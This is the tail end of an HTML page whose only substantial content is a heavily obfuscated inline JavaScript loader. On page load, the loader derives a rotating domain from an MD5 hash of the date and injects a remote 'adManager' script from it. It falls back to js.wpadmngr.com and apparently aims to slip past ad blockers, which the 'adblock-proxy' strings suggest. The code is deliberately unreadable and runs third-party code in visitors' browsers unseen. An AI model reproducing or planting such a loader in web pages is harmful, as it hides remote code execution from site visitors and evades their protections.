<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<X3[Xa(0x9b)];X2+=0x10){X8=X4,X9=X5,XX=X6,XR=X7,X4=B(X4,X5,X6,X7,X3[X2+0x0],0x7,-0x28955b88),X7=B(X7,X4,X5,X6,X3[X2+0x1],0xc,-0x173848aa),X6=B(X6,X7,X4,X5,X3[X2+0x2],0x11,0x242070db),X5=B(X5,X6,X7,X4,X3[X2+0x3],0x16,-0x3e423112),X4=B(X4,X5,X6,X7,X3[X2+0x4],0x7,-0xa83f051),X7=B(X7,X4,X5,X6,X3[X2+0x5],0xc,0x4787c62a),X6=B(X6,X7,X4,X5,X3[X2+0x6],0x11,-0x57cfb9ed),X5=B(X5,X6,X7,X4,X3[X2+0x7],0x16,-0x2b96aff),X4=B(X4,X5,X6,X7,X3[X2+0x8],0x7,0x698098d8),X7=B(X7,X4,X5,X6,X3[X2+0x9],0xc,-0x74bb0851),X6=B(X6,X7,X4,X5,X3[X2+0xa],0x11,-0xa44f),X5=B(X5,X6,X7,X4,X3[X2+0xb],0x16,-0x76a32842),X4=B(X4,X5,X6,X7,X3[X2+0xc],0x7,0x6b901122),X7=B(X7,X4,X5,X6,X3[X2+0xd],0xc,-0x2678e6d),X6=B(X6,X7,X4,X5,X3[X2+0xe],0x11,-0x5986bc72),X5=B(X5,X6,X7,X4,X3[X2+0xf],0x16,0x49b40821),X4=y(X4,X5,X6,X7,X3[X2+0x1],0x5,-0x9e1da9e),X7=y(X7,X4,X5,X6,X3[X2+0x6],0x9,-0x3fbf4cc0),X6=y(X6,X7,X4,X5,X3[X2+0xb],0xe,0x265e5a51),X5=y(X5,X6,X7,X4,X3[X2+0x0],0x14,-0x16493856),X4=y(X4,X5,X6,X7,X3[X2+0x5],0x5,-0x29d0efa3),X7=y(X7,X4,X5,X6,X3[X2+0xa],0x9,0x2441453),X6=y(X6,X7,X4,X5,X3[X2+0xf],0xe,-0x275e197f),X5=y(X5,X6,X7,X4,X3[X2+0x4],0x14,-0x182c0438),X4=y(X4,X5,X6,X7,X3[X2+0x9],0x5,0x21e1cde6),X7=y(X7,X4,X5,X6,X3[X2+0xe],0x9,-0x3cc8f82a),X6=y(X6,X7,X4,X5,X3[X2+0x3],0xe,-0xb2af279),X5=y(X5,X6,X7,X4,X3[X2+0x8],0x14,0x455a14ed),X4=y(X4,X5,X6,X7,X3[X2+0xd],0x5,-0x561c16fb),X7=y(X7,X4,X5,X6,X3[X2+0x2],0x9,-0x3105c08),X6=y(X6,X7,X4,X5,X3[X2+0x7],0xe,0x676f02d9),X5=y(X5,X6,X7,X4,X3[X2+0xc],0x14,-0x72d5b376),X4=H(X4,X5,X6,X7,X3[X2+0x5],0x4,-0x5c6be),X7=H(X7,X4,X5,X6,X3[X2+0x8],0xb,-0x788e097f),X6=H(X6,X7,X4,X5,X3[X2+0xb],0x10,0x6d9d6122),X5=H(X5,X6,X7,X4,X3[X2+0xe],0x17,-0x21ac7f4),X4=H(X4,X5,X6,X7,X3[X2+0x1],0x4,-0x5b4115bc),X7=H(X7,X4,X5,X6,X3[X2+0x4],0xb,0x4bdecfa9),X6=H(X6,X7,X4,X5,X3[X2+0x7],0x10,-0x944b4a0),X5=H(X5,X6,X7,X4,X3[X2+0xa],0x17,-0x41404390),X4=H(X4,X5,X6,X7,X3[X2+0xd],0x4,0x289b7ec6),X7=H(X7,X4,X5,X6,X3[X2+0x0],0xb,-0x155ed806),X6=H(X6,X7,X4,X5,X3[X2+0x3],0x10,-0x2b10cf7b),X5=H(X5,X6,X7,X4,X3[X2+0x6],0x17,0x4881d05),X4=H(X4,X5,X6,X7,X3[X2+0x9],0x4,-0x262b2fc7),X7=H(X7,X4,X5,X6,X3[X2+0xc],0xb,-0x1924661b),X6=H(X6,X7,X4,X5,X3[X2+0xf],0x10,0x1fa27cf8),X5=H(X5,X6,X7,X4,X3[X2+0x2],0x17,-0x3b53a99b),X4=X0(X4,X5,X6,X7,X3[X2+0x0],0x6,-0xbd6ddbc),X7=X0(X7,X4,X5,X6,X3[X2+0x7],0xa,0x432aff97),X6=X0(X6,X7,X4,X5,X3[X2+0xe],0xf,-0x546bdc59),X5=X0(X5,X6,X7,X4,X3[X2+0x5],0x15,-0x36c5fc7),X4=X0(X4,X5,X6,X7,X3[X2+0xc],0x6,0x655b59c3),X7=X0(X7,X4,X5,X6,X3[X2+0x3],0xa,-0x70f3336e),X6=X0(X6,X7,X4,X5,X3[X2+0xa],0xf,-0x100b83),X5=X0(X5,X6,X7,X4,X3[X2+0x1],0x15,-0x7a7ba22f),X4=X0(X4,X5,X6,X7,X3[X2+0x8],0x6,0x6fa87e4f),X7=X0(X7,X4,X5,X6,X3[X2+0xf],0xa,-0x1d31920),X6=X0(X6,X7,X4,X5,X3[X2+0x6],0xf,-0x5cfebcec),X5=X0(X5,X6,X7,X4,X3[X2+0xd],0x15,0x4e0811a1),X4=X0(X4,X5,X6,X7,X3[X2+0x4],0x6,-0x8ac817e),X7=X0(X7,X4,X5,X6,X3[X2+0xb],0xa,-0x42c50dcb),X6=X0(X6,X7,X4,X5,X3[X2+0x2],0xf,0x2ad7d2bb),X5=X0(X5,X6,X7,X4,X3[X2+0x9],0x15,-0x14792c6f),X4=U(X4,X8),X5=U(X5,X9),X6=U(X6,XX),X7=U(X7,XR);}return v(X4)+v(X5)+v(X6)+v(X7);},M=function(F){return r+'/'+q(n+':'+T+':'+F);},P=function(){var Xu=Xe;return r+'/'+q(n+':'+t+Xu(0xae));},J=document[Xe(0xa6)](Xe(0xaf));Xe(0xa8)in J?(L=L[Xe(0xa3)]('.js',Xe(0x9d)),J[Xe(0x91)]='module'):(L=L[Xe(0xa3)](Xe(0x9c),Xe(0xb4)),J[Xe(0xb3)]=!![]),N=q(n+':'+I+':domain')[Xe(0xa9)](0x0,0xa)+Xe(0x8a),r=Xe(0x92)+q(N+':'+I)[Xe(0xa9)](0x0,0xa)+'.'+N,J[Xe(0x96)]=M(L)+Xe(0x9c),J[Xe(0x87)]=function(){window[O]['ph'](M,P,N,n,q),window[O]['init'](h);},J[Xe(0xa2)]=function(){var XQ=Xe,F=document[XQ(0xa6)](XQ(0xaf));F['src']=XQ(0x98),F[XQ(0x99)](XQ(0xa0),h),F[XQ(0xb1)]='async',document[XQ(0x97)][XQ(0xab)](F);},document[Xe(0x97)][Xe(0xab)](J);}document['readyState']===XG(0xaa)||document[XG(0x9e)]===XG(0x8f)||document[XG(0x9e)]==='interactive'?K():window[XG(0xb7)](XG(0x8e),K);}()));function X(){var Xj=['addEventListener','onload','charAt','509117wxBMdt','.com','charCodeAt','split','988kZiivS','DOMContentLoaded','loaded','533092QTEErr','type','https://','6ebXQfY','toISOString','22mCPLjO','src','head','https://js.wpadmngr.com/static/adManager.js','setAttribute','per','length','.js','.m.js','readyState','2551668jffYEE','data-admpid','827096TNEEsf','onerror','replace','0123456789abcdef','909NkPXPt','createElement','2259297cinAzF','noModule','substring','complete','appendChild','1VjIbCB','loc',':tags','script','cks','async','10xNKiRu','defer','.l.js','469955xpTljk','ksu'];X=function(){return Xj;};return X();}</script>
	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>